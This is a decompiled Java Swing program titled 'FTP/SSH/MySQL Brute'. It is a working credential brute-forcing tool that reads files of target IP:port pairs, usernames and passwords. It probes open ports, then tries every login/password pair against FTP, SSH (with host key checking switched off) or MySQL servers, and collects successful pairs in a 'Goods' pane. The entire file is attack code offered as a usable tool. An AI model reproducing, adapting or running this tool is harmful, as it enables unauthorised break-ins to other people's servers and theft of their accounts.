/*
 * Decompiled with CFR 0.152.
 */
package com.mysql.jdbc.jdbc2.optional;

import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import com.mysql.jdbc.Connection;
import java.awt.EventQueue;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.LayoutStyle;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

public class GuiFTP_SSH_MySQL_Brute_Nirvana
extends JFrame {
    private List<String> listUsers = new ArrayList<String>();
    private List<String> listPasswords = new ArrayList<String>();
    private static Thread thread = null;
    static int th = 0;
    private JButton jButton1;
    private JComboBox<String> jComboBox1;
    private JLabel jLabel1;
    private JLabel jLabel2;
    private JLabel jLabel3;
    private JLabel jLabel4;
    private JLabel jLabel5;
    private JTextField jTextField1;
    private JTextField jTextField2;
    private JTextField jTextField3;
    private TextArea textArea1;
    private TextArea textArea2;

    public GuiFTP_SSH_MySQL_Brute_Nirvana() {
        this.initComponents();
    }

    private void initComponents() {
        this.jTextField1 = new JTextField();
        this.jLabel1 = new JLabel();
        this.jTextField2 = new JTextField();
        this.jLabel2 = new JLabel();
        this.jTextField3 = new JTextField();
        this.jLabel3 = new JLabel();
        this.textArea1 = new TextArea();
        this.textArea2 = new TextArea();
        this.jLabel4 = new JLabel();
        this.jLabel5 = new JLabel();
        this.jButton1 = new JButton();
        this.jComboBox1 = new JComboBox();
        this.setTitle("FTP/SSH/MySQL Brute");
        this.jTextField1.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiFTP_SSH_MySQL_Brute_Nirvana this$0;
            {
                this.this$0 = guiFTP_SSH_MySQL_Brute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute_Nirvana.access$0(this.this$0, evt);
            }
        });
        this.jLabel1.setText("List with IP:Port");
        this.jTextField2.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiFTP_SSH_MySQL_Brute_Nirvana this$0;
            {
                this.this$0 = guiFTP_SSH_MySQL_Brute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute_Nirvana.access$1(this.this$0, evt);
            }
        });
        this.jLabel2.setText("List with logins");
        this.jLabel3.setText("List with passwords");
        this.jLabel4.setText("Log");
        this.jLabel5.setText("Goods");
        this.jButton1.setText("Start");
        this.jButton1.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiFTP_SSH_MySQL_Brute_Nirvana this$0;
            {
                this.this$0 = guiFTP_SSH_MySQL_Brute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute_Nirvana.access$2(this.this$0, evt);
            }
        });
        this.jComboBox1.setModel(new DefaultComboBoxModel<String>(new String[]{"FTP", "SSH", "MySQL"}));
        GroupLayout layout = new GroupLayout(this.getContentPane());
        this.getContentPane().setLayout(layout);
        layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addComponent(this.jTextField1).addComponent(this.jTextField2).addComponent(this.jLabel1).addComponent(this.jLabel2).addComponent(this.jTextField3, -1, 104, Short.MAX_VALUE)).addComponent(this.jLabel3).addComponent(this.jLabel4)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 119, Short.MAX_VALUE).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addComponent(this.jLabel5).addComponent(this.textArea1, -2, 206, -2).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jComboBox1, GroupLayout.Alignment.LEADING, 0, -1, Short.MAX_VALUE).addComponent(this.jButton1, -1, -1, Short.MAX_VALUE)).addContainerGap()))).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addComponent(this.textArea2, -2, 207, -2).addContainerGap(222, Short.MAX_VALUE))));
        layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(19, 19, 19).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField1, -2, -1, -2).addGap(9, 9, 9).addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField2, -2, -1, -2)).addComponent(this.jButton1, -2, 78, -2)).addGap(13, 13, 13).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel3).addComponent(this.jComboBox1, -2, -1, -2)).addGap(1, 1, 1).addComponent(this.jTextField3, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel4).addComponent(this.jLabel5)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, -1, Short.MAX_VALUE).addComponent(this.textArea1, -2, 150, -2).addGap(21, 21, 21)).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addContainerGap(193, Short.MAX_VALUE).addComponent(this.textArea2, -2, 150, -2).addGap(20, 20, 20))));
        this.pack();
    }

    private void jTextField1ActionPerformed(ActionEvent evt) {
    }

    private void jTextField2ActionPerformed(ActionEvent evt) {
    }

    private void jButton1ActionPerformed(ActionEvent evt) {
        new Thread(this){
            final /* synthetic */ GuiFTP_SSH_MySQL_Brute_Nirvana this$0;
            {
                this.this$0 = guiFTP_SSH_MySQL_Brute_Nirvana;
            }

            public void run() {
                try {
                    BufferedReader sourceReader = new BufferedReader(new FileReader(new File(GuiFTP_SSH_MySQL_Brute_Nirvana.access$3(this.this$0).getText())));
                    String sourceLine = null;
                    while ((sourceLine = sourceReader.readLine()) != null) {
                        String sourceLine2 = sourceLine;
                        GuiFTP_SSH_MySQL_Brute_Nirvana.access$4(this.this$0).append(String.valueOf(sourceLine2) + "\n");
                        String[] splitS = sourceLine2.split(":");
                        if (!GuiFTP_SSH_MySQL_Brute_Nirvana.portIsOpen(splitS[0], Integer.parseInt(splitS[1]), 1000)) continue;
                        if (GuiFTP_SSH_MySQL_Brute_Nirvana.access$5(this.this$0).getSelectedItem() == "FTP") {
                            try {
                                this.this$0.bruteFTP(splitS);
                            }
                            catch (IOException ex) {
                                Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
                            }
                        }
                        if (GuiFTP_SSH_MySQL_Brute_Nirvana.access$5(this.this$0).getSelectedItem() == "SSH") {
                            try {
                                this.this$0.bruteSSH(splitS);
                            }
                            catch (Exception ex) {
                                Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
                            }
                        }
                        if (GuiFTP_SSH_MySQL_Brute_Nirvana.access$5(this.this$0).getSelectedItem() != "MySQL") continue;
                        try {
                            this.this$0.bruteMySQL(splitS);
                        }
                        catch (Exception ex) {
                            Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                }
                catch (Exception ex) {
                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }.start();
    }

    public static boolean portIsOpen(String ip, int port, int timeout) {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), timeout);
            socket.close();
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }

    public void bruteMySQL(String[] splitS) throws Exception {
        String host = splitS[0];
        int port = Integer.parseInt(splitS[1]);
        Scanner in = new Scanner(new FileReader(this.jTextField2.getText()));
        this.listUsers.clear();
        this.listPasswords.clear();
        while (in.hasNext()) {
            this.listUsers.add(in.next());
        }
        Scanner in2 = new Scanner(new FileReader(this.jTextField3.getText()));
        while (in2.hasNext()) {
            this.listPasswords.add(in2.next());
            System.out.println(this.listPasswords.size());
        }
        for (String user : this.listUsers) {
            for (String password : this.listPasswords) {
                if ("%empty%".equals(password)) {
                    password = "";
                }
                try {
                    this.textArea2.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                    Connection connection = null;
                    try {
                        connection = (Connection)DriverManager.getConnection("jdbc:mysql://" + host + ":" + port, user, password);
                    }
                    catch (SQLException sQLException) {
                        // empty catch block
                    }
                    if (connection == null) continue;
                    this.textArea1.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void bruteSSH(String[] splitS) throws Exception {
        String host = splitS[0];
        int port = Integer.parseInt(splitS[1]);
        BufferedReader sourceReader = new BufferedReader(new FileReader(new File(this.jTextField2.getText())));
        String name = null;
        while ((name = sourceReader.readLine()) != null) {
            BufferedReader sourceReader2 = new BufferedReader(new FileReader(new File(this.jTextField3.getText())));
            String password2 = null;
            while ((password2 = sourceReader2.readLine()) != null) {
                String user = name;
                if ("%empty%".equals(password2)) {
                    password2 = "";
                }
                String password = password2;
                this.textArea2.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                try {
                    JSch jsch = new JSch();
                    Session session = jsch.getSession(user, host, port);
                    session.setPassword(password);
                    session.setConfig("StrictHostKeyChecking", "no");
                    session.connect();
                    ChannelSftp sftpChannel = (ChannelSftp)session.openChannel("sftp");
                    sftpChannel.connect();
                    this.textArea1.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                }
                catch (Exception e) {
                    System.err.print(e);
                }
            }
        }
    }

    public void bruteFTP(String[] splitS) throws FileNotFoundException, IOException {
        String server = splitS[0];
        int port = Integer.parseInt(splitS[1]);
        BufferedReader sourceReader = new BufferedReader(new FileReader(new File(this.jTextField2.getText())));
        String name = null;
        while ((name = sourceReader.readLine()) != null) {
            BufferedReader sourceReader2 = new BufferedReader(new FileReader(new File(this.jTextField3.getText())));
            String password = null;
            while ((password = sourceReader2.readLine()) != null) {
                String user = name;
                if ("%empty%".equals(password)) {
                    password = "";
                }
                String pass = password;
                this.textArea2.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + pass + "\n");
                FTPClient ftpClient = new FTPClient();
                try {
                    ftpClient.connect(server, port);
                    int replyCode = ftpClient.getReplyCode();
                    if (!FTPReply.isPositiveCompletion(replyCode)) {
                        return;
                    }
                    boolean success = ftpClient.login(user, pass);
                    if (!success) continue;
                    this.textArea1.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + pass + "\n");
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }
    }

    public static void main(String[] args) {
        try {
            UIManager.LookAndFeelInfo[] lookAndFeelInfoArray = UIManager.getInstalledLookAndFeels();
            int n = lookAndFeelInfoArray.length;
            int n2 = 0;
            while (n2 < n) {
                UIManager.LookAndFeelInfo info = lookAndFeelInfoArray[n2];
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
                ++n2;
            }
        }
        catch (ClassNotFoundException ex) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        catch (InstantiationException ex) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        catch (IllegalAccessException ex) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        catch (UnsupportedLookAndFeelException ex) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            Class.forName("com.mysql.jdbc.Driver");
        }
        catch (ClassNotFoundException ex) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        EventQueue.invokeLater(new Runnable(){

            public void run() {
                new GuiFTP_SSH_MySQL_Brute_Nirvana().setVisible(true);
            }
        });
    }

    static /* synthetic */ void access$0(GuiFTP_SSH_MySQL_Brute_Nirvana guiFTP_SSH_MySQL_Brute_Nirvana, ActionEvent actionEvent) {
        guiFTP_SSH_MySQL_Brute_Nirvana.jTextField1ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$1(GuiFTP_SSH_MySQL_Brute_Nirvana guiFTP_SSH_MySQL_Brute_Nirvana, ActionEvent actionEvent) {
        guiFTP_SSH_MySQL_Brute_Nirvana.jTextField2ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$2(GuiFTP_SSH_MySQL_Brute_Nirvana guiFTP_SSH_MySQL_Brute_Nirvana, ActionEvent actionEvent) {
        guiFTP_SSH_MySQL_Brute_Nirvana.jButton1ActionPerformed(actionEvent);
    }

    static /* synthetic */ JTextField access$3(GuiFTP_SSH_MySQL_Brute_Nirvana guiFTP_SSH_MySQL_Brute_Nirvana) {
        return guiFTP_SSH_MySQL_Brute_Nirvana.jTextField1;
    }

    static /* synthetic */ TextArea access$4(GuiFTP_SSH_MySQL_Brute_Nirvana guiFTP_SSH_MySQL_Brute_Nirvana) {
        return guiFTP_SSH_MySQL_Brute_Nirvana.textArea2;
    }

    static /* synthetic */ JComboBox access$5(GuiFTP_SSH_MySQL_Brute_Nirvana guiFTP_SSH_MySQL_Brute_Nirvana) {
        return guiFTP_SSH_MySQL_Brute_Nirvana.jComboBox1;
    }
}

